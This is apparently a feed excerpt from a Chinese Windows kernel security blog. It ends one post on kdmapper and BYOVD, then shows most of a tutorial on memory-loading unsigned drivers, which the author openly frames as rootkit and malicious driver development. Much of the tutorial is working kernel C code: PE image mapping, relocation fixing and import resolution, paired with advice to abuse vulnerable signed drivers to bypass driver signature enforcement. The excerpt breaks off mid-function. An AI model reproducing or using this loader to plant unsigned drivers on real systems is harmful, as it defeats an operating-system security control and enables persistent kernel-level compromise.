(!kdmapper::MapDriver(raw_image.data(), <span class="number">0</span>, <span class="number">0</span>, <span class="built_in">free</span>, !copyHeader, mode, passAllocationPtr, callbackExample, &amp;exitCode)) &#123;</span><br><span class="line">Log(<span class="string">L&quot;[-] Failed to map &quot;</span> &lt;&lt; driver_path &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>);</span><br><span class="line">intel_driver::Unload();</span><br><span class="line">PauseIfParentIsExplorer();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830165818760.png" alt="image-20250830165818760"></p><p>有两百行代码，简单说就是把文件加载到内存然后修复重定位表，IAT表，cookie。然后设置一个函数入口点，进行调用，大体跟上篇内存加载驱动的逻辑一样的。</p><h3 id="驱动卸载"><a href="#驱动卸载" class="headerlink" title="驱动卸载"></a>驱动卸载</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!intel_driver::Unload()) &#123;</span><br><span class="line">Log(<span class="string">L&quot;[-] Warning failed to fully unload vulnerable driver &quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>);</span><br><span class="line">PauseIfParentIsExplorer();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;《内存加载驱动》文章里面，我们详细看了一下如何使用驱动去内存加载驱动，落实到实际种，我们需要解决的问题还是怎么与BYOVD联动起来，而kdm</summary>
      
    
    
    
    <category term="Windows Kernel安全研究" scheme="https://250wuyifan.github.io/categories/Windows-Kernel%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
    
    <category term="Windows Kernel安全研究" scheme="https://250wuyifan.github.io/tags/Windows-Kernel%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
  </entry>
  
  <entry>
    <title>内存加载驱动</title>
    <link href="https://250wuyifan.github.io/2025/08/29/%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E9%A9%B1%E5%8A%A8/"/>
    <id>https://250wuyifan.github.io/2025/08/29/%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E9%A9%B1%E5%8A%A8/</id>
    <published>2025-08-29T15:27:51.000Z</published>
    <updated>2025-08-29T20:41:56.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在做恶意驱动开发的时候，想要rootkit，最重要的问题就是驱动能不能加载进去，驱动开发好了，没有签名无法加载使用也是没用，所以我们可以使用内存加载驱动这种技术，把未签名的驱动加载进去，我们这篇文章使用的是自己写了一个驱动，然后驱动做一个内存加载另一个驱动，实际情况下，也可使用BYOVD技术，使用有漏洞的签名驱动进行内存加载行为，一切就合理了。</p><h2 id="PE文件格式"><a href="#PE文件格式" class="headerlink" title="PE文件格式"></a>PE文件格式</h2><p>PE文件这一块主包从刚开始学逆向就看这一块，看吐了。大家自行搜索pe这一块知识，exe sys dll都属于PE文件。</p><h2 id="磁盘文件转换为内存映像"><a href="#磁盘文件转换为内存映像" class="headerlink" title="磁盘文件转换为内存映像"></a>磁盘文件转换为内存映像</h2><p>首先我们面对的情况就是一个我们写好的恶意sys驱动文件，目标就是把这个文件加载进内存，那么要做的就是磁盘文件转换为内存映像，首先要知道pe文件格式最开始有个DOS头，头部前几个字节如果是MZ开头说明是PE文件，然后在DOS的最后几个字节是跟NT头的偏移，NT头里面又有很多的数据结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _IMAGE_DOS_HEADER -r3</span><br><span class="line">ntdll!_IMAGE_DOS_HEADER</span><br><span class="line">   +<span class="number">0x000</span> e_magic          : Uint2B</span><br><span class="line">   +<span class="number">0x002</span> e_cblp           : Uint2B</span><br><span class="line">   +<span class="number">0x004</span> e_cp             : Uint2B</span><br><span class="line">   +<span class="number">0x006</span> e_crlc           : Uint2B</span><br><span class="line">   +<span class="number">0x008</span> e_cparhdr        : Uint2B</span><br><span class="line">   +<span class="number">0x00a</span> e_minalloc       : Uint2B</span><br><span class="line">   +<span class="number">0x00c</span> e_maxalloc       : Uint2B</span><br><span class="line">   +<span class="number">0x00e</span> e_ss             : Uint2B</span><br><span class="line">   +<span class="number">0x010</span> e_sp             : Uint2B</span><br><span class="line">   +<span class="number">0x012</span> e_csum           : Uint2B</span><br><span class="line">   +<span class="number">0x014</span> e_ip             : Uint2B</span><br><span class="line">   +<span class="number">0x016</span> e_cs             : Uint2B</span><br><span class="line">   +<span class="number">0x018</span> e_lfarlc         : Uint2B</span><br><span class="line">   +<span class="number">0x01a</span> e_ovno           : Uint2B</span><br><span class="line">   +<span class="number">0x01c</span> e_res            : [<span class="number">4</span>] Uint2B</span><br><span class="line">   +<span class="number">0x024</span> e_oemid          : Uint2B</span><br><span class="line">   +<span class="number">0x026</span> e_oeminfo        : Uint2B</span><br><span class="line">   +<span class="number">0x028</span> e_res2           : [<span class="number">10</span>] Uint2B</span><br><span class="line">   +<span class="number">0x03c</span> e_lfanew         : Int4B</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; DT _IMAGE_NT_HEADERS -r3</span><br><span class="line">ntdll!_IMAGE_NT_HEADERS</span><br><span class="line">   +<span class="number">0x000</span> Signature        : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> FileHeader       : _IMAGE_FILE_HEADER</span><br><span class="line">      +<span class="number">0x000</span> Machine          : Uint2B</span><br><span class="line">      +<span class="number">0x002</span> NumberOfSections : Uint2B</span><br><span class="line">      +<span class="number">0x004</span> TimeDateStamp    : Uint4B</span><br><span class="line">      +<span class="number">0x008</span> PointerToSymbolTable : Uint4B</span><br><span class="line">      +<span class="number">0x00c</span> NumberOfSymbols  : Uint4B</span><br><span class="line">      +<span class="number">0x010</span> SizeOfOptionalHeader : Uint2B</span><br><span class="line">      +<span class="number">0x012</span> Characteristics  : Uint2B</span><br><span class="line">   +<span class="number">0x018</span> OptionalHeader   : _IMAGE_OPTIONAL_HEADER</span><br><span class="line">      +<span class="number">0x000</span> Magic            : Uint2B</span><br><span class="line">      +<span class="number">0x002</span> MajorLinkerVersion : UChar</span><br><span class="line">      +<span class="number">0x003</span> MinorLinkerVersion : UChar</span><br><span class="line">      +<span class="number">0x004</span> SizeOfCode       : Uint4B</span><br><span class="line">      +<span class="number">0x008</span> SizeOfInitializedData : Uint4B</span><br><span class="line">      +<span class="number">0x00c</span> SizeOfUninitializedData : Uint4B</span><br><span class="line">      +<span class="number">0x010</span> AddressOfEntryPoint : Uint4B</span><br><span class="line">      +<span class="number">0x014</span> BaseOfCode       : Uint4B</span><br><span class="line">      +<span class="number">0x018</span> BaseOfData       : Uint4B</span><br><span class="line">      +<span class="number">0x01c</span> ImageBase        : Uint4B</span><br><span class="line">      +<span class="number">0x020</span> SectionAlignment : Uint4B</span><br><span class="line">      +<span class="number">0x024</span> FileAlignment    : Uint4B</span><br><span class="line">      +<span class="number">0x028</span> MajorOperatingSystemVersion : Uint2B</span><br><span class="line">      +<span class="number">0x02a</span> MinorOperatingSystemVersion : Uint2B</span><br><span class="line">      +<span class="number">0x02c</span> MajorImageVersion : Uint2B</span><br><span class="line">      +<span class="number">0x02e</span> MinorImageVersion : Uint2B</span><br><span class="line">      +<span class="number">0x030</span> MajorSubsystemVersion : Uint2B</span><br><span class="line">      +<span class="number">0x032</span> MinorSubsystemVersion : Uint2B</span><br><span class="line">      +<span class="number">0x034</span> Win32VersionValue : Uint4B</span><br><span class="line">      +<span class="number">0x038</span> SizeOfImage      : Uint4B</span><br><span class="line">      +<span class="number">0x03c</span> SizeOfHeaders    : Uint4B</span><br><span class="line">      +<span class="number">0x040</span> CheckSum         : Uint4B</span><br><span class="line">      +<span class="number">0x044</span> Subsystem        : Uint2B</span><br><span class="line">      +<span class="number">0x046</span> DllCharacteristics : Uint2B</span><br><span class="line">      +<span class="number">0x048</span> SizeOfStackReserve : Uint4B</span><br><span class="line">      +<span class="number">0x04c</span> SizeOfStackCommit : Uint4B</span><br><span class="line">      +<span class="number">0x050</span> SizeOfHeapReserve : Uint4B</span><br><span class="line">      +<span class="number">0x054</span> SizeOfHeapCommit : Uint4B</span><br><span class="line">      +<span class="number">0x058</span> LoaderFlags      : Uint4B</span><br><span class="line">      +<span class="number">0x05c</span> NumberOfRvaAndSizes : Uint4B</span><br><span class="line">      +<span class="number">0x060</span> DataDirectory    : [<span class="number">16</span>] _IMAGE_DATA_DIRECTORY</span><br><span class="line">         +<span class="number">0x000</span> VirtualAddress   : Uint4B</span><br><span class="line">         +<span class="number">0x004</span> Size             : Uint4B</span><br></pre></td></tr></table></figure><p>数据结构如上，可以下载一些编译器来查看，或者去vs里面调用一些接口可以直接看数据结构。要做的就是把文件里面这些东西直接放到内存进行按内存对齐规则复制数据即可，代码如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//先解析PE文件获取image(拉伸)</span></span><br><span class="line">PUCHAR <span class="title function_">FileToImange</span><span class="params">(<span class="type">char</span>* FileBuffer)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!FileBuffer) <span class="keyword">return</span> FALSE;</span><br><span class="line"><span class="comment">//获取dos头</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)FileBuffer;</span><br><span class="line"><span class="comment">//获取NT头</span></span><br><span class="line"><span class="comment">//NT头 = 文件的起始位置 + dos头的e_lfanew</span></span><br><span class="line"><span class="comment">//NT头也可以通过`RtlImageNtHeader`获得，不过这个函数没有文档化，需要提前声明PIMAGE_NT_HEADERS* RtlImageNtHeader(void* Base)</span></span><br><span class="line">PIMAGE_NT_HEADERS pNts = (PIMAGE_NT_HEADERS)(FileBuffer + pDos-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">创建ImageBuffer</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//获取PE文件的Image大小</span></span><br><span class="line">ULONG SizeOfImage = pNts-&gt;OptionalHeader.SizeOfImage;</span><br><span class="line"><span class="comment">//申请一块内存</span></span><br><span class="line"><span class="comment">//使用非分页内存来保证可执行，使用PE的Image大小作为申请的大小</span></span><br><span class="line">PUCHAR ImageBuffer = ExAllocatePool(NonPagedPool, SizeOfImage);</span><br><span class="line"><span class="comment">//将申请的内存清空</span></span><br><span class="line"><span class="built_in">memset</span>(ImageBuffer, <span class="number">0</span>, SizeOfImage);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//复制PE头,将pe文件复制到ImageBuffer，按照所有头部总和的大小复制</span></span><br><span class="line"><span class="built_in">memcpy</span>(ImageBuffer, FileBuffer, pNts-&gt;OptionalHeader.SizeOfHeaders);</span><br><span class="line"><span class="comment">//获取PE文件的节区数量</span></span><br><span class="line">ULONG NumberOfSections = pNts-&gt;FileHeader.NumberOfSections;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获得第一个节区</span></span><br><span class="line">PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNts);</span><br><span class="line"><span class="comment">//复制节区</span></span><br><span class="line"><span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//将文件的PE头复制到image中</span></span><br><span class="line"><span class="built_in">memcpy</span>(ImageBuffer + pSection-&gt;VirtualAddress, FileBuffer + pSection-&gt;PointerToRawData, pSection-&gt;SizeOfRawData);</span><br><span class="line"><span class="comment">//获取下一个pSection</span></span><br><span class="line">pSection++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将存储拉伸后的PE头的ImageBuffer返回</span></span><br><span class="line"><span class="keyword">return</span> ImageBuffer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="修复重定位"><a href="#修复重定位" class="headerlink" title="修复重定位"></a>修复重定位</h2><h3 id="什么是重定位（Relocation）？"><a href="#什么是重定位（Relocation）？" class="headerlink" title="什么是重定位（Relocation）？"></a><strong>什么是重定位（Relocation）？</strong></h3><ul><li><strong>背景</strong>：PE文件编译时会假设自己加载到某个固定基址（如<code>0x400000</code>）。若该地址被占用，系统会将其加载到其他地址（如<code>0x500000</code>）。</li><li><strong>问题</strong>：代码中所有硬编码的绝对地址（如<code>call 0x401000</code>）会失效。</li><li><strong>解决方案</strong>：PE文件包含 <strong>重定位表</strong>（<code>.reloc</code>节），记录所有需要调整的绝对地址位置。</li></ul><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830005848347.png" alt="image-20250830005848347"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//修复重定位,传入拉伸后的ImageBuffer</span></span><br><span class="line">BOOLEAN <span class="title function_">UpdataRelocation</span><span class="params">(<span class="type">char</span>* ImageBuffer)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!ImageBuffer) <span class="keyword">return</span> FALSE;</span><br><span class="line"><span class="comment">//获取PE的NT头，这里使用未文档化的函数进行获取</span></span><br><span class="line">PIMAGE_NT_HEADERS pNts = RtlImageNtHeader(ImageBuffer);</span><br><span class="line"><span class="comment">//如果没有获取到，返回FALSE</span></span><br><span class="line"><span class="keyword">if</span> (!pNts) <span class="keyword">return</span> FALSE;</span><br><span class="line"><span class="comment">//取目录表，目录表是第五个,也就是IMAGE_DIRECTORY_ENTRY_BASERELOC</span></span><br><span class="line"><span class="comment">//因为是`PIMAGE_DATA_DIRECTORY`是个指针，所以后面的pNts要取地址</span></span><br><span class="line">PIMAGE_DATA_DIRECTORY iReplocation = &amp;pNts-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];</span><br><span class="line"><span class="comment">//取重定位信息的位置，ImageBuffer + RVA(偏移)</span></span><br><span class="line">PIMAGE_BASE_RELOCATION pBase = (PIMAGE_BASE_RELOCATION)(ImageBuffer + iReplocation-&gt;VirtualAddress);</span><br><span class="line"></span><br><span class="line"><span class="comment">//当这两个都存在的时候就证明还存在需要修复的重定向</span></span><br><span class="line"><span class="comment">//当块的大小和虚拟地址都是空的退出</span></span><br><span class="line"><span class="keyword">while</span> (pBase-&gt;SizeOfBlock &amp;&amp; pBase-&gt;VirtualAddress)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//指向块的位置</span></span><br><span class="line"><span class="comment">//PIMAGE_RELOC RelocationBlock = (PIMAGE_RELOC)(pBase-&gt;VirtualAddress + ImageBuffer + sizeof(IMAGE_BASE_RELOCATION));</span></span><br><span class="line">PIMAGE_RELOC RelocationBlock = (PIMAGE_RELOC)((PUCHAR)pBase + <span class="keyword">sizeof</span>(IMAGE_BASE_RELOCATION));</span><br><span class="line"><span class="comment">//计算需要修复的重定向的数目</span></span><br><span class="line">UINT32 NumberOfRelocation = (pBase-&gt;SizeOfBlock - <span class="keyword">sizeof</span>(IMAGE_BASE_RELOCATION)) / <span class="keyword">sizeof</span>(IMAGE_RELOC);</span><br><span class="line"><span class="comment">//遍历每一个节区</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NumberOfRelocation; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (RelocationBlock[i].Type == IMAGE_REL_BASED_DIR64)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//64位</span></span><br><span class="line">PUINT64 Address = (PUINT64)((PUINT8)ImageBuffer + pBase-&gt;VirtualAddress + RelocationBlock[i].Offset);</span><br><span class="line">UINT64 Delta = *Address - pNts-&gt;OptionalHeader.ImageBase + (PUINT8)ImageBuffer;</span><br><span class="line">*Address = Delta;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (RelocationBlock[i].Type == IMAGE_REL_BASED_HIGHLOW)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//32位</span></span><br><span class="line">PUINT32 Address = (PUINT32)((PUINT8)ImageBuffer + pBase-&gt;VirtualAddress + (RelocationBlock[i].Offset));</span><br><span class="line">UINT32 Delta = *Address - pNts-&gt;OptionalHeader.ImageBase + (PUINT8)ImageBuffer;</span><br><span class="line">*Address = Delta;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//循环完一次就到下一个模块</span></span><br><span class="line">pBase = (PIMAGE_BASE_RELOCATION)((PUCHAR)pBase + pBase-&gt;SizeOfBlock);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="修复IAT"><a href="#修复IAT" class="headerlink" title="修复IAT"></a>修复IAT</h2><p>修复IAT需要分成3步</p><ol><li>要有一个遍历模块，根据IAT表中的函数名查询其模块基地址</li><li>根据函数名字找到其对应模块中对应的函数地址</li><li>修复IAT</li></ol><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830015757002.png" alt="image-20250830015757002"></p><p>我们可以看到这一个驱动程序所需要的只有这一个程序里面的导出函数</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830020511040.png" alt="image-20250830020511040"></p><p>所以我们要修复导入表就要获取这个的基地址，然后获取他里面的导出表，导入表与这个的导出表进行对应，找到了直接偏移加基地址即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;tools.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//根据提供的模块名，遍历内核模块，返回模块基址</span></span><br><span class="line"><span class="comment">//这个返回值（ULONG_PTR）有个好处，就是当编译为32位的时候他是32，64位是64</span></span><br><span class="line"><span class="comment">//moduleName示例：”Win.dll“</span></span><br><span class="line">ULONG_PTR <span class="title function_">QueryModule</span><span class="params">(PUCHAR moduleName, ULONG_PTR* moduleSize)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (moduleName == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">RTL_PROCESS_MODULES rtlModule = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">PRTL_PROCESS_MODULES SystemModules = &amp;rtlModule;</span><br><span class="line"><span class="comment">//是否开辟内存了，默认为没开辟内存</span></span><br><span class="line">BOOLEAN isAlloc = FALSE;</span><br><span class="line"><span class="comment">//测量长度，确认一下需要多少内存来存放我们查询出来的结果</span></span><br><span class="line">ULONG* retLength = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//查询，这一次查询主要是为了确认我们需要申请多少内存存放结果</span></span><br><span class="line">NTSTATUS status = ZwQuerySystemInformation(SystemModuleInformation, SystemModules, <span class="keyword">sizeof</span>(RTL_PROCESS_MODULES), &amp;retLength);</span><br><span class="line"><span class="comment">//如果返回值是大小不匹配，也就是代表着我们给的结构体小了，那么就会在retLength参数中返回实际需要的大小</span></span><br><span class="line"><span class="comment">//分配实际大小的内存，也就是上面最终返回的retLength</span></span><br><span class="line"><span class="keyword">if</span> (status == STATUS_INFO_LENGTH_MISMATCH)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//申请内存，不需要执行,大小拿返回出来的正确大小+结构大小</span></span><br><span class="line">SystemModules = ExAllocatePool(PagedPool, retLength + <span class="keyword">sizeof</span>(RTL_PROCESS_MODULES));</span><br><span class="line"><span class="comment">//如果申请失败</span></span><br><span class="line"><span class="keyword">if</span> (!SystemModules) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="comment">//申请成功的话进行初始化</span></span><br><span class="line"><span class="built_in">memset</span>(SystemModules, <span class="number">0</span>, retLength + <span class="keyword">sizeof</span>(RTL_PROCESS_MODULES));</span><br><span class="line"></span><br><span class="line"><span class="comment">//再查一次,这回提供正确的大小(模块总长度)</span></span><br><span class="line">NTSTATUS status = ZwQuerySystemInformation(SystemModuleInformation, SystemModules, retLength + <span class="keyword">sizeof</span>(RTL_PROCESS_MODULES), &amp;retLength);</span><br><span class="line"><span class="comment">//如果还不成功，那就释放内存</span></span><br><span class="line"><span class="keyword">if</span> (!NT_SUCCESS(status))</span><br><span class="line">&#123;</span><br><span class="line">ExFreePool(SystemModules);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//证明内存申请了</span></span><br><span class="line">isAlloc = TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">由于我们接下来会有比较，但是我们传进来的不是完整路径只有一个名字的模块名字，和遍历获得的模块全路径作比较</span></span><br><span class="line"><span class="comment">所以我们只能通过是否包含来确定是否一致，而这要求2者都是大写</span></span><br><span class="line"><span class="comment">但是由于我们传进来的`moduleName`是一个常量，正常情况下无法修改，所以这里采用创建内存然后拷贝的方法修改</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//存放我们转换成大写的传进来的模块名</span></span><br><span class="line">PUCHAR KernelModuleName = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//用来存放找到的模块的基址</span></span><br><span class="line">ULONG_PTR moduleBase = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这里使用do-while结构主要是为了方便当我们想获取ntoskrn.exe模块的时候可以获取到后直接break出去然后释放内存</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//在32位的29912分页下，会有两个内核，也就是会有两个`ntoskrn.exe`内核模块</span></span><br><span class="line"><span class="keyword">if</span> (_stricmp(moduleName, <span class="string">&quot;ntoskrnl.exe&quot;</span>) == <span class="number">0</span> || _stricmp(moduleName, <span class="string">&quot;ntkrnlpa.exe&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//将当前第一个模块存储在ModuleInfo中,内核模块永远是第一个</span></span><br><span class="line">PRTL_PROCESS_MODULE_INFORMATION ModuleInfo = &amp;SystemModules-&gt;Modules[<span class="number">0</span>];</span><br><span class="line"><span class="comment">//根据ModuleInfo获取模块基地址</span></span><br><span 